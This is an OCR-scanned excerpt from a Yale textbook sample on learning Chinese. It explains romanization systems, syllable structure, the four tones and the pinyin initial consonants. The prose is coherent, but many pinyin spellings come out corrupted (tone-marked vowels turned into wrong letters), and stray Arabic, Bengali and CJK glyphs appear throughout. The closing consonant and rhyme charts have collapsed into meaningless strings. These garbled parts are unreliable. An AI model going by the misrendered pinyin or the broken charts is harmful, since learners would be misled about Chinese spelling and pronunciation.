represent\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION xlvii\n\nSelling New Year scrolls, Taibéi\n\nsyllables. Using technical names, English writing is primarily phonographic,\nand Chinese is primarily logographic.\n\nRepresenting the sounds of Chinese\n\nAlphabetic systems for writing Chinese date back at least to the 16th century.\nMost have made use of Roman letters, and are therefore called Romanizations\n(often written with a capital letter). We can illustrate some of the systems, using\nthe compound word for ‘Chinese [spoken] language’:\n\nWade-Giles Changkuo hua\n\nYale Janggwo hwa\n\nNational Romanization Jong-guo huah\n\nHanyt Pinyin Zhonggu6 hua\n\nZhtyin Fthao 一 义 人 乡 义巳 十 厂 义 干 、\n\nThe Wade-Giles system (named for its originator Thomas Wade, a professor\nof Chinese at Cambridge University at the turn of the 19th century, and Herbert\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxviii INTRODUCTION\n\nA. Giles, a consular officer and, later, Wade’s successor at Cambridge who\nincorporated the system into his dictionary) was used for many years in library\ncatalogues and in most English-language publications on China. It is known\nfor distinguishing the plain initial consonants from the aspirated (g from k, d\nfrom t, etc., in the pinyin system) by use of an apostrophe: kuo versus k’uo, for\nexample, or chung versus ch’ung. (This is phonetically quite sensible since both\nsounds are voiceless in Chinese.)\n\nThe Yale system grew out of work performed by the U.S. War Department\nduring World War II and was used in the Yale textbook series, familiar to\nseveral generations of students of Chinese. As much as possible, it used\nthe values of English letters to represent Chinese pronunciation, so it is the\nmost transparent of all the Romanization systems (for speakers of English).\nNational Romanization, a system that had official status in China during the\n19308, incorporates tone in the spelling (notice that there are no tone marks\nabove the vowels), which makes it invaluable for learning and retaining tones.\nHanyti Pinyin is the official system of the PRC and has been accepted by most\nof the rest of the world, including, recently, Taiwan.\n\nFinally, Zhityin Fuhao (‘indicating-sounds transcription’), the last of the\nsystems illustrated, is colloquially called Bopo mofo after the first four letters of\nits alphabet. It has a longer history than pinyin, based on a system created in\n1919 called Zhuyin Zimii (‘indicating-sounds alphabet’) that was intended to\nserve as a full-fledged writing system. It was inspired by the Japanese ‘kana’\nsystem, whose symbols derive from characters rather than Roman letters. Bopo\nmofo symbols have the advantage of appearing Chinese and not suggesting any\nparticular English (or other language’s) sound values. In Taiwan, children,\nas well as many foreign students, learn to read with materials in which Bopo\nmofo is written vertically to the right of corresponding characters to indicate\npronunciation.\n\nHanyti Pinyin\n\nPinyin (‘spelling the sound’) was developed and officially adopted by the PRC\nin the 1950s, and it is now used in textbooks, dictionaries, reference sources,\ncomputer input systems, and on road and shop signs in Mainland China. In\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION xlix\n\nrecent years, some schools in China have been encouraging children at certain\nstages in their education to write essays in pinyin to improve composition and\nstyle, and it is not unlikely that its functions will continue to expand in the\nfuture.\n\nIt is sometimes claimed that pinyin (or any other such system of transcribing\nthe sounds of Mandarin) cannot serve as a full-fledged writing system because\nthe degree of homophony in Chinese is such that some reference to characters\nis necessary for disambiguation. This is certainly true in the case of the shi story\ncited earlier, and it might be true for Classical Chinese in general. However, it\nis certainly not true for texts written in colloquial styles. Anything that can be\nunderstood in speech can be written and understood in pinyin. Many people e-mail\nsuccessfully in pinyin without even indicating the tones! The question is, using\npinyin, how far one can stray from colloquial speech and still be understood.\nWritten styles range from the relatively colloquial to the relatively classical, but\nif the latter can be understood when read aloud, then they can presumably be\nunderstood when written in pinyin.\n\n百 花 齐 放 , 百 家 争 鸣\n\nBaihua qifang, baijia zhengmtfmgl\n\n‘Let a hundred flowers blossom and a hundred schools of thought\ncontend)’\n\n(‘100-flowers together-blossom, 100-schools [of thought] contend’)\n\nKey Terms\n\nPeoples Republic of China (PRC)\nThe Mainland\n\nThe Republic of China (ROC)\nTaiwan\n\nHong Kong (Xiang Gang)\n\nBéijing (Peking)\n\nBéiping (Peiping)\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION\n\nQing (Manchu) dynasty (1644-1911)\nMing (Han) dynasty (1368-1644)\nYudn (Mongol) dynasty (1271-1368)\n\n1842\n\n1912\n\n1949\n\n(۸۸۰ Zédong\n\nChiang Kai-shek (Jiang Jiéshi)\nSun Yat-sen (Sin Yixidn)\n\nChinese\n\nGuanhua (officials’ language)\nMandarin\n\nGu6b) (national language)\nPtiténghua (ordinary language)\n\nStandard Chinese\n\nClassical Chinese (Wénydn)\n\nBdihua (vernacular written Chinese)\nTdiyt (Taiwanese Minnan)\nTaiwanese Mandarin\n\nHanyti Pinyin\nWade-Giles\nZhuyin 7000 (Bopo mofo)\n\nlingua franca\n\ndialects\n\nregional languages\nCantonese\nFujianese (Hokkien)\nKejia (Hakka)\nShanghainese\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION li\n\noracle bone inscriptions (jidgtiwén)\nittle seal characters (xidozhuan)\nmodel script (kdishi)\n\nraditional characters (fantizi)\nsimplified characters (jidntizi)\n\nhomophony\npictograms\nideograms\n\nogograms\n\nNOTES\n\n1.

Pinyin will\nrepresent pronunciation and be your written code for conversational or ‘sayable’\nmaterial in Chinese. This lesson introduces the whole system but pays particular\nattention to those elements that you will need in order to actually use the language\nin the next lesson, that is, tones, initials, and certain ‘rhymes’. The units that follow\nthis lesson will provide you with actual language (transcribed and, in many cases,\nrecorded for you). You will be able to refer back to this lesson both to confirm\ninformation and to flesh out the system. As you proceed through the units, you will\nbe learning to relate sound to symbol so that you can accurately read out and write\ndown the Chinese language samples that you will be practicing.\n\nContents\n\n0.1 Syllable components (Exercise 1) 3\n0.2 Tones (Exercise 2) 6\n০.3 Initial consonants (Exercise 3) 12\n‏ہہ‎ Rhymes (Exercises 4, 5, 6) 7\n‏وہ‎ Miscellany 23\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n2 SOUNDS AND SYMBOLS\n0.6 Writing connected text in pinyin 25\n‏ہہ‎ Recapitulation (Exercise 7) 27\nCoda 30\n\nTo learn to speak a language, you need to master its sounds. This is not easy.\nIt requires changing habits of articulation that were deeply internalized during\nthe first few years of your life and are now quite automatic. It also requires\nlearning to pay attention to sounds that may have no particular importance in\nyour native language but are crucially important in the new one. What is more,\nwhile you are establishing these new habits, you have to hold on to the old.\nEventually, you will learn to switch between two systems, but while you are\nearning, there is bound to be interference from the first language (which will\nikely be English for most users of this book). In the early stages of language\nearning, recordings will help, but the critical role will be played by your\neachers, who have advice, know the pitfalls, and can provide timely feedback.\n\nAs you learn Chinese, you need to be able to write down the new language,\nnot simply in an ad hoc fashion, but in a way that allows you to have an unam-\n\nbiguous record of the pronunciation. As you know, Chinese has an aesthetically\npleasing but mnemonically challenging character writing system. Even though\nmany characters do offer phonetic hints to those who know where to look, they\noffer no information about pronunciation at all to the learner. To cite a particu-\nlarly clear case: 木 is pronounced mu, 林 is lin, and 椒 is sén. The graphs are\nadditive; the sounds are not. Of course, English is not completely reliable either;\nwords like ‘lead’ can be pronounced [leed] or [led], and the three spellings ‘to,’\n‘too,’ ‘two’ all have the same sound. However, words written in an alphabetical\nsystem almost always provide some sort of phonetic hint that helps in the\nrecovery of sound. (Exceptions in English would be signs such as + or & that\noffer no help to the uninitiated; they are, in fact, functionally like characters.)\n\nThe solution for the learner is a system of transcription that represents the\nsounds of Chinese with relatively few symbols and uses them consistently, so\nthat—unlike English—words can be pronounced reliably. The Introduction (p.\nxlix) mentioned a number of such systems used for Chinese in the past, many\nof them with virtues. The official system, used for textbooks, for reference\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 3\n\nworks, on signs, and for computer input, is Hanyu Pinyin, which means, liter-\nally, ‘Chinese spelling of sounds’. It was developed in the mid-1950s in China,\nunder the guidance of the venerable Zhéu Youguang, who, at the time of this\nwriting, was still alive and working at the age of 103.\n\nDONGZHI\n\nBéijing metro station sign, including characters and pinyin\n(the latter without tones)\n\n0.1 Syllable components\n\n‎Sound versus symbol (letter)‏ دہ\n\n‎From the start, it is important to make a distinction between sound and the\nrepresentation of sound. In pinyin, for example, ji represents a sound like [jee]\n(with ‘level tone’), qi represents [chee]. Neither is hard (for English speakers)\nto imitate, but the way the latter is represented—with a ‘q’ (and no subsequent\n‘u’)—is counterintuitive and difficult to remember at first. On the other hand,\npinyin r represents a sound that, for many speakers of standard Chinese, is a\nblend of the T of ‘run’ with the ‘s’ (pronounced [ 印 of ‘pleasure’ (or the 宁 of\nFrench je)—in other words, an T with friction. This sound may be difficult for\nnon-Chinese speakers to produce well, but associating it with the symbol T is\nless problematical. So, as you learn pinyin, you may encounter problems of\n\n‎Copyright © 2011 Yale University\nLearning Chinese Sample\n\n4 SOUNDS AND SYMBOLS\n\npronunciation on the one hand, and problems of transcription on the other. It\nis important to keep the distinction clear.\n\n0.1.2 The syllable\n\nWhen introducing the sounds of standard Chinese, it is useful to begin with\nthe syllable, a unit whose prominence is underscored by the one-character-per-\nsyllable writing system. The spoken syllable in Chinese is traditionally analyzed\nin terms of an initial consonant sound and a rhyme, the latter being everything\nother than the initial. Chinese schoolchildren, when focusing on pronunciation,\noften read syllables (which are usually also meaningful units) in an exaggerated\ninitial-rhyme division: tuh + ‏تا‎ = tu ‘hare’, ‏طط‎ + ong = long ‘dragon’, etc.\n\nThe written pinyin syllable (as opposed to the spoken syllable) can also be\nusefully analyzed in terms of an initial (C;) and a rhyme. The rhyme, in turn,\ncontains vowels (V), tones (T) written above the vowels, medials (M), and\nendings (E). Of these, only the vowel is always present (as, for example, in the\nsentence-final particle that is simply an untoned a). All possible pinyin syllables\ncan be represented by the following formula (with V underlined as the only\nobligatory unit); there are so few options for M (medials) and E (endings) that\nthey can be usefully listed in our formula.\n\nINITIAL RHYME\nT\nCG + M + ¥V + E\n۱ ۱\ni U 乙 i, ০ (but o+o = ou) and n, ng\n\nExamples (which you need not know how to pronounce yet):\n\nVowel: a\n\nVowel/Tone: a,e\n\nInitial + Vowel/Tone: ta, bi, ké, sha\n\nInitial + Medial + Vowel/Tone: xié, zud, dui, xué, jit, niié\nInitial + Vowel/Tone + Ending: 121, hao, hén, mang\n\nInitial + Medial + Vowel/Tone + Ending: ]130, jian, jiang\n\nCopyright © 2011 Yale University\n\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 5\n\nThere are 21 pinyin initial consonants. They are usually presented in a chart\nof representative syllables, arranged in rows and columns (see section 0.3.1).\nWhether the initials are written with a single consonant letter (I, m, 2) or several\n(sh, zh), they all represent only one sound unit (or phoneme). Chinese has no\ninitial clusters—consonant blends—of the sort represented by ‘cl’ or ‘sn’ in\nEnglish.\n\nThere are six possible (written) vowels: a, ¢, i, 0, u, and ii (the last a ‘rounded\nhigh front’ vowel, as in German iiber or the last vowel of French 144 vu). Vowels\ncan be preceded by medials (i, u, ii) and followed by endings, two of which are\nwritten with vowel symbols (i, 0) and two with consonants (n, ng). There is\nactually a third (written) vowel ending that can occur after the main vowel (in\naddition to i and 0), and that is u. When the main vowel is 0, the ending o is\nwritten ۷ to avoid the misleading combination ‘oo’. Thus, to cite words from\nUnit 1, one finds hdo and Ido (both with ato), but instead of ‘déo’ or ‘zhéo’\n(070), you get déu and zhéu (both with u).\n\nNotice that the inventory of consonant endings in Chinese is small—there\nare only n and ng. Regional languages, such as Cantonese, have more (-p, -t,\n-m, etc.). The English name of the Chinese frying pan, the ‘wok’, is derived\nfrom a Cantonese word with a final [k] sound; its standard Chinese counterpart,\nguo, lacks the final consonant. In historical terms, standard Chinese has lost\nmost final consonants, while Cantonese has preserved them. Surnames often\ndemonstrate this same distinction between the presence and absence of a final\nconsonant in standard Chinese and Cantonese: Lu/Luk, Ye/Yip, for example\n(see Unit 4, Appendix 2 for more examples).\n\nTones are a particularly interesting feature of the Chinese sound system and\nwill be discussed in more detail below. For now, we note that stressed syllables\nmay have one of four possible tones, indicated by the use of diacritical marks\nwritten over the main vowel (V). Unstressed syllables, however, do not have\ntonal contrasts; their pitch is, for the most part, conditioned by that of sur-\nrounding syllables.\n\nBecause medials, vowels, and some endings are all written with vowel letters,\npinyin rhymes may have strings of two or three vowel letters, such as: iu, iao,\nuai. This can be confusing, particularly with ‘opposites’ such as iu/ui, ie/ei, and\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n6 SOUNDS AND SYMBOLS\n\nuo/ou, which represent quite different sounds. Later, there will be exercises that\nfocus on such vowel combinations.\n\nBy convention, the tone mark is placed on the vowel proper, not on the\nmedial or ending, as in: Iéi, jido, zu. As a rule of thumb, look to see if the first\nof two vowel letters is a possible medial. If it is, then the following vowel letter\nis the core vowel, which receives the tone mark; if it is not, then this first letter\n\nis the core vowel: lié, zhdo, xué, dou, jido.\n\nExercise 1\n\nOne sound that is not shown in the syllable formula given above is the final\n\n‘r’ sound. It is represented, not surprisingly, by r in pinyin, and is obligatory\nin a few words with the written e-vowel, such as ér ‘two’. In northern varieties\nof standard Chinese, a common word-building suffix, appearing mostly in\nnouns and favored by some speakers and regions more than others, is also\nrepresented by a final r didnr, hudr banr, hudngr. The final r often blends with\nthe rest of the syllable according to rather complicated rules that will be dis-\ncussed in detail in later lessons.\n\n0.2 Tones\n\nWords in Chinese are pronounced with a regular tonal contour, much like the\nstress patterns that distinguish the English verb ‘reCORD’ from the noun\n‘REcord’. In Chinese, the word ldoshi ‘teacher’, for example, is pronounced loshi\n(‘low’ followed by ‘high’). In English terms, this is like having to say TEAcher\nrather than teaCHER or TEACHER (with both syllables stressed) each time you\nsay the word. The presence of tones in Chinese is often cited as another of\nthose lurid features that make the language unique and difficult to learn; but\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 7\n\ntones are, in fact, not unique to Chinese and probably no more difficult to learn\nthan stress or intonation is for learners of English.\n\nAs noted earlier, there are four basic tones in Mandarin. This is far fewer than\nsome of the regional Chinese languages. Cantonese, for example, is usually ana-\nlyzed as having four tones on two levels, plus one, for a total of nine. Mandarin\nalso differs from many of the regional languages in having a predilection for\nwords with (non-initial) toneless syllables: shiishu ‘uncle’; xingli ‘luggage’.\n\n0.2.1 The four tones\n\nIt is difficult to learn to produce or even recognize tones from descriptions,\nthough we will use the descriptive terms ‘high (and level)’, ‘rising’, ‘low’, and\n‘falling’ as a way of referring to them. These terms are only suggestive of the\nactual shape of the tone, but they do underscore the symmetry of the system:\na high and a low, a rising and a falling. In modern Chinese, though the tones\nhave formal names (that can only be rationalized by reference to earlier stages\nof the language), it is common practice to refer to them numerically by using\n\nthe numbers 1-4 (yi, ér, san, si) and the word for sound, shéng [shuhng]: yishéng,\nérshéng, sanshéng, sishéng. (Toneless syllables are called gingshéng ‘light-toned’.)\nIn English, we can also refer to the tones as ‘first’, ‘second’, ‘third’, and ‘fourth’.\nAs noted earlier, in pinyin, tones are indicated by marks placed over the main\nvowel letter.\n\nTones\n\n0.2.2 Tone concepts\nTo learn to produce tones, it is useful to conceive of them in particular ways.\nThe first tone, for example, which has a high and level contour, can be thought\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n8 SOUNDS AND SYMBOLS\n\nof as sung out, because singing a syllable in English usually results in a sus-\ntained level pitch similar to the high tone. The second tone, which rises from\nmid-low to high, can be associated with doubt or uncertainty: ‘Did you say\n“tea”? “milk”? “Mao”? “Wang”?’ The third tone is the subject of the next para-\ngraph, but the fourth tone, which falls from very high to low, can usefully be\nassociated with list final intonation: ‘One, two, three (all rising), and four!’ For\nmany people, the fourth tone contour is also associated with certainty: ‘I said\n“Wei” or ‘It’s late.’\n\n0.2.3 The low tone\nYou will notice that the pinyin symbol for the low tone is v-shaped, suggesting\na contour that falls, then rises. In isolation, it does indeed fall and rise: hdo ‘be\ngood’; w6 ‘I; me’; jidng ‘speak; explain’. In close conjunction with a following\nsyllable (other than one with the same low tone, as shown below), it tends to\nhave a low, non-rising pitch.\n\nIf you can find a Chinese speaker to model the following phrases (from Unit\n1), try listening for the relatively low pitch in the low-toned syllable, hén [huhn]\n‘very; quite’, that appears at the beginning of the following phrases.\n\nhén ‏متع‎ ‘tall’\nhén mang ‘Dusy’\nhén léi ‘tired’\n\nFor most speakers, a low-toned syllable in the second position of a phrase\nwill also stay low, without much of a rise. Again, if you can find a speaker\nto model the following phrases, see if you agree that the second syllable is\nprimarily low.\n\nshift ‘calligraphy’\ntudnti ‘group’\nkanfa ‘point of view’\n\nFor learners, regarding the third tone as ‘low’, before learning that it rises\nin certain contexts, produces better results than learning it as a falling-rising\npitch and only canceling the final rise in certain contexts. So we will refer to\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 9\n\nthe third tone as ‘low’, and to produce it, you aim low and add the final rise\nonly when the syllable is isolated.\n\n0.2.4 Toneless syllables\nSyllables in initial position in Mandarin almost always have one of the four\n‘ones, but those following a toned syllable can be toneless. In Chinese, such\nsyllables have gingshéng ‘the light tone’. In this respect, Mandarin contrasts with\nsome regional Chinese languages such as Cantonese, in which almost all syl-\nables are toned, regardless of their position in the word.\nMandarin toneless syllables are of two types: those which never have full\n‘ones and those which can have tones but may become toneless after a stressed\nsyllable. The question particle, ma, is an example of the first: Mang ma? ‘Are\n\nyou] busy?’ The final ma never has a tone. Other common examples are the\n\nmany compound words with iambic stress pattern such as xingli ‘luggage’ and\nshiifu ‘to be comfortable’. The second type will be discussed in Unit 2, after you\nhave examples to refer to.\n\n0.2.5 The tone chart\nThe chart below uses twelve of the most common surnames to illustrate the\nfour tones. In Chinese, the surname is the first component of the full name,\n\nnot the last (e.g., Liin Li Lidnjié—Jet Li’s Chinese name). In the chart, the four\ntones are characterized in terms of their pitch contours (high and level, rising,\n\netc.) as well as by the four heuristic concepts (sung out, doubt, etc.) that will\n\nhelp you to produce them correctly.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n10 SOUNDS AND SYMBOLS\nExercise 2\n\nThe following short sentences consist of the pronoun ta ‘he; she’, the verb\nxing [sying] ‘to be surnamed’, and one of the twelve surnames presented\nabove. Keeping your tone concepts in mind and, ideally, with feedback\nfrom a Chinese speaker, focus on the different tones of the surnames\nwhile pronouncing the sentences.\n\nTa xing Zhang. ‘His/Her surname is Zhang.’\nTa xing Mao.\nTa xing Wéi.\nTa xing Wang.\nTa xing Kong.\nTa xing Zhou.\nTa xing Du.\nTa xing Gao.\nTa xing Ma.\nTa xing Chén.\nTa xing Zhao.\nTa xing Li.\n\n0.2.6 An aside on the history of Chinese tones\n\nTone systems as complex as those of Chinese are a feature of dozens of lan-\nguages spoken in China and adjoining regions of mainland Southeast Asia,\nincluding the national languages of Burma, Thailand, and Vietnam. One tends\nto think of tone as being primarily a matter of pitch—like notes in a song. Pitch\nis controlled by stretching or loosening the vocal chords in the throat, rather\nlike what happens when you stretch or loosen the mouth of a balloon. Tone is\noften more than just pitch. Even in standard Chinese, it is also associated with\nlength; the rising tone, for example, is noticeably shorter than the high, level\ntone. In Southeast Asian languages, such as standard Vietnamese and Burmese,\n\nCopyright © 2011 Yale University\n\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 11\n\nSpecial attention to the rising tone, 0161800\n\ntone involves quality of voice as well as pitch (and length), so descriptions of\ntones may include terms like ‘breathy’ or ‘creaky’. The term ‘tone’, therefore,\ncovers a complex set of features.\n\nWhile tones may be a more or less permanent feature of the region, tone\nsystems may appear, evolve, or even disappear within particular languages.\nEvidence from ancient Chinese rhyme tables and other sources indicates that\nthe various Chinese tonal systems evolved from an earlier system which, like\nthe current standard, also consisted of four tones. The modern Mandarin pro-\nnunciation of the names of the four ancient tones are: ping ‘level’, shang ‘rising’,\nqu ‘going’, and rv ‘entering’. The last was found only with checked syllables,\nthose ending with stopped consonants such as ‘k’, ৮, and ‘p’, which, as noted\nearlier, are no longer found in Mandarin, but survive in Cantonese and other\nregional Chinese languages. This four-tone system evolved differently in dif-\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n12 SOUNDS AND SYMBOLS\n\nferent dialect groups. In standard Cantonese, for example, the four-tone system\nsplit into two sets of four tones each, with one set relatively higher than the\nother; an additional distinct tone derived from another split, providing a total\nof nine distinctive tones.\n\nYou may feel fortunate that the Mandarin dialects did not undergo the same\ndevelopment as Cantonese. In Mandarin, the ancient four-tone system remained\nas four tones, but they underwent a redistribution. Words with the rv tone,\nfor example, are no longer a distinctive set in Mandarin; they have joined\nwith words whose tones were originally ping, shang, or qu. The ri-toned words\nwere distinguished mainly by the final stopped consonants (‘p’, ‘t’, ‘k’), and\nonce those were lost, the ۲۸ tone was no longer distinct from the other three\ntones.\n\nIn another Mandarin development, ping-toned words split into two groups\nand formed two of the four modern tones, first tone (high and level) and second\ntone (rising), a development that is reflected in the names of those tones in\nmodern Chinese, yinping and ydngping. Yinping arose from ping-toned syllables\nwith yin—or voiced initial consonants; yéngping arose from ping-toned syllables\nwith ydng—or voiceless initials. So the modern tones that you find in the stan-\ndard language, though still four in number, are neither pronounced the same\nway nor found on the same words as in the four-tone system that existed some\n1,500 years ago.\n\nA more detailed discussion of both the historical development of tone in\nChinese and the tonal systems found in other varieties of Chinese can be found\nin books such as Norman (1988), listed at the end of the Introduction.\n\n0.3 Initial consonants\n\nFirst, note that many pinyin letters are pronounced similarly to their English\nequivalents; the | in Ido, for example, is very like the English ‘I’, and the pinyin\n卜 s n, and m all have more or less the same values in Chinese and English\nscripts. Unfortunately, such cases are liable to make you think of English even\nwhen pinyin letters have values that are rather different. Below is a table of\nsymbols that represent all possible initial consonants of Chinese. Following\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 13\n\nChinese custom, they are presented with a particular set of vowels and ordered\nfrom front of the mouth (labials) to back (velars and glottals).\n\n0.3.1 The consonant chart\nFirst, letters w and y, which do appear initially in pinyin (e.g., the numbers wit\n‘five’ and yi ‘one’), are treated as special cases of medial u and i, respectively,\nin initial position. Thus, instead of ‘1’, one finds yi; instead of 词 , wii; instead\nof ‘ié’, yé; instead of ‘ud’, wo; etc. This will be discussed again in detail later.\nSecond, the vowels conventionally placed with the different classes of initials\nto make them pronounceable turn out to be some of those that have quite idio-\nsyncratic values for speakers of English. Thus, the o in the first line of the table\nbelow is not pronounced like the English long vowel ‘o’ but more like the vowel\nsound in the word ‘paw’; the e in the second line is pronounced [uh]; the i in\nthe third and fourth lines represents a continuation of the initial into a buzz\n(e.g., zi [dzz]; zhi [jrr]), but in the fifth line it represents the more expected [ee]\n(e.g., ji [jee]). The vowel sounds will be discussed in §o.4 below, but for now, you\ncan use the hints provided in the far right column of the chart and imitate your\n\nteacher or the audio. You should learn to declaim (for sound) and write (for\nsymbol) this table, line by line, as soon as possible: bo po mo fo, de te ne le, etc.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n14 SOUNDS AND SYMBOLS\n0.3.2 Notes on the consonant chart\n\nCOLUMNS! AND I! In English, the distinction between sounds typically written\n‘b’ and ‘p’ or ‘d’ and ‘t’ is usually said to be one of voicing (vocal chord vibra-\nion): with ‘b’ and ‘d’, voicing begins relatively earlier than with ‘p’ and ‘t’.\nHowever, in Chinese, the onset of voicing of the column I consonants is dif-\nferent from that of English. The sound represented by b in pinyin is actually\nbetween the English [b] and [p]; that represented by d is between the English\n0] and [t], etc. This is why the Wade-Giles system of Romanization (mentioned\nin the Introduction) uses ‘p, p’’ (i.e., p, p-apostrophe) rather than ‘b, p’ (T’aipei\nrather than Taibei). In phonetic terms, both b and p are voiceless in pinyin, but\n\nhe first is unaspirated while the second is aspirated (that is, accompanied by\na noticeable explosion of air). Being aware of this will help you to adjust to what\nyou hear; in fact, the English letters ‘b’, ‘d’, and ‘g’ are not highly voiced by\nmost speakers (compared to their equivalents in, say, French and Spanish), so\nif you pronounce them ‘lightly’ in Chinese, you will not have too strong an\naccent. Contrast: bo/po, de/te, ge/ke; and zi/ci, zhi/chi, ji/qi.\n\nROW 1 These consonants are ‘labials’, or those whose pronunciation involve\nthe lips. The pinyin o (not ou) only appears after the labials (bo po mo fo) and\nis, for many English speakers, pronounced like [aw] in ‘paw’. Everywhere other\nthan after labial consonants, the same sound is written uo. Thus bo, po, mo,\nand fo rhyme with duo, tuo, nuo, and luo (the latter set not shown in the table\nabove). In other words, o by itself always equals uo (and never ou). Apparently,\nthe creators of pinyin felt that, following labial initials, it was not necessary to\nindicate the labial onset with ‘u’. It will be important to keep the sound of o/\nuo separate from that of ou. The last (ou) rhymes with both syllables of the\nEnglish exclamation ‘oh no’.\n\nROWS 3, 4, AND 5—THE CRUCIAL ROWS! With z, c, and s in row 3, the tongue is\ntense but flat and touching the back of the teeth near the gum line. The letter\ni, following row 3 initials, is not pronounced [ee]; it simply represents a continu-\nation of the consonant sound. So, for zi, ci, and si, think [dzz], [tsz], and [ssz]\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 15\n\n(as indicated in the far left column). English does not have consonant sounds\ncomparable to the first two row 3 initials, z and c, except across root boundar-\nies: pads, cats. In German and Russian, though, similar sounds do occur at the\nbeginning of words, such as in German zehn [dz-] ‘ten’, or Russian cend [ts-]\n‘price’. The latter example, also written with a ‘c’, demonstrates the Russian\ninfluence on the creators of pinyin.\n\nWith zh, ch, sh, and r in row 4, the tongue is pulled back and the tip is raised\ntoward the roof of the mouth (on or near the rough area behind the teeth known\nas the alveolar ridge) in what is called a retroflex position. When preceding\nvowels without lip rounding (all but ০ or u), including 1 as in the table (zhi,\netc.), the lips are tight and slightly spread, which allows teachers to see and\nhear whether the retroflex series is being pronounced correctly. As with the\nrow 3 initials, the letter i in this position represents only a buzz. So, for zhi,\nchi, shi, and ri, think [jr], [chr], [shr], and [rr]. In English, an ‘r’ following a\nconsonant will often produce the retroflex articulation of the tongue that is\ncharacteristic of the row 4 consonants. Another way to ensure that your tongue\nis in the correct position for those initials is to match zh to the ‘dr’ of ‘drill’, ch\nto the ‘tr’ of ‘trill’, sh to the ‘shr’ of ‘shrill’, and r to the ‘r’ of ‘rill’.\n\nFinally, with j, q, and x of row 5, the tongue is positioned like the ‘yie’ in\nEnglish ‘yield’. This time, the letter i is pronounced [ee], so for ji, gi, and xi,\nthink [jyee], [chyee], and [syee]. Later, you will see that row 5 initials are followed\nonly by the written vowels i and u. The first will always be pronounced [ee]\nin this context; the second will always be pronounced [ii]. Every time you\nencounter row ‏و‎ initials, think i is [ee] and ۷ is [ii].\n\nTHE INITIAL R OF ROW 4 Pronunciation of the letter ‘r’ varies considerably\namong languages: the Scots trill their tongue tips; the Parisians flutter their\nuvulas; the Spanish flap their tongues; and the well-known American television\ninterviewer, Barbara Walters, pronounces it like a cross between [r] and [ছা].\nThe Chinese r is different again; it has a little bit of a buzz to it. Like zh, ch,\nand sh, it is retroflex (with tongue pushed back and tip raised) so it resembles\nthe initial sound of English ‘rill’ or ‘ridge’, but it also has friction like the ‘s’ in\n‘pleasure’ (or French je ‘I’). You will observe considerable variation in the\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n16 SOUNDS AND SYMBOLS\n\nquality of the Chinese r, depending on the following vowel and on the particular\nspeaker. Examples: rén, ré, ru, rang, ۲۷۵, rou, ri.\n\nExercise 3\nTry pronouncing the following syllables, randomly selected from the ini-\ntials in rows 3, 4, and 5.

The penultimate\ncolumn, marked ‘w/o 0\" (ie., ‘without initial consonant’), lists syllables\nthat lack an initial consonant (with the rarer ones placed in parentheses) and\nthus begin with a (written) vowel or medial (the latter always represented with\nan initial y or w). The final column provides pronunciation hints. Asterisks\n(*) following certain row numbers indicate sets that require special atten-\ntion. Final r, whose special properties were mentioned above, is treated\nseparately.\n\nCopyright © 2011 Yale University\nCopyright © 2011 Yale University\n\nت٥3‏ 3 ج۸ت\n\nSatrhU ‏37ہ‎\n\n(617)ء۔ 3-601\n\n3+ (g1)\n90-3 (Zt)\nU-3 (91)\n‏ات‎\n‎3 (71)\nsu-e-n (€1)\nuen (তা)\nre-n (11)\nen = (o1)\n810-71 (6)\nu-et ৬(8)\novr (0\nE-T (9)\n930-6 (9)\nu-e ( 以 )\n‏چو‎ (9\nre (z)\n\n3 (1)\n\nanu anx anb ant\n210۷ ay 21% at\nsusp 3৮০০ Suays 3ম]\nues Ma  uays = uayz\n20 লে ছে\n24 215 210 212\n\n3৮115 3৮৮1৫ suond 38111]\nকট\n100111]0\n\n‎ond = ony‏ پیٹ یت\n]ں3 ‎3৮৮1৮ sunib‏\n\n‎uvix ‏طرمص‎ uot\n\n‎০৮1% ‏طروہ‎ onl\n\n‎1x ৮10 ot\n\n‎3৮৮%। “8uodz 3৮৮৪ 300]\nwoo upyz  هبیہ‎ 101\n০৮৫ ০৮৮ ovya 004\n2 700 ۹۷ 404\npu op nya 04\n\n‎5310/۱۲۸۹ GANOLNN\n\n‎an}\n‎suayz\n\n‎707021\n\n‎2\n‎21\n\n‎(710132\n\n‎supz 3৮৮]\n\n‏21 9ی\nجوم ‎ovl‏\n‎fie 0‏\n\n‎01 09\n\n‎[0904 and\n[yas ad\n[suyn (sua)\n[uyn ua\n[Ke(y)] (09)\n[yn 9\n[8udeA] 3004\n4\n\n‎(10a)\n\n‎vn\n\n‎suvd\n\n‎]03۸[ uod\nood\n\n‎ok\n\n‎suv\n\n‎up\n\n‎ov\n\n‎10\n\n‎0\n\n‎LNIH bo)\n\n‎0 100 o/m\n\n‎Learning Chinese Sample\nCopyright © 2011 Yale University\n\n[unk und unx unb unt U-n ,(S¢)\n[nk na nu 111 nx nb nf T (৮0 sawdys 4 oy,\n[oak nod mp ny nix mb mf nt ,(€€)\n[uynm 14 ung uny দাত ‏ہلا‎ unys U-n ,(z¢) ‏لصو‎\n‎[oom nn 0 nz nyz 11 115 n (79 [oo] ay,\nsuod suoix Suoib suoif ‏ہمیں8‎ (০6\n3uoz suo] 3৮০৮ suoyz ‏.س8‎ (62)\n[yo no noy9 noy nop  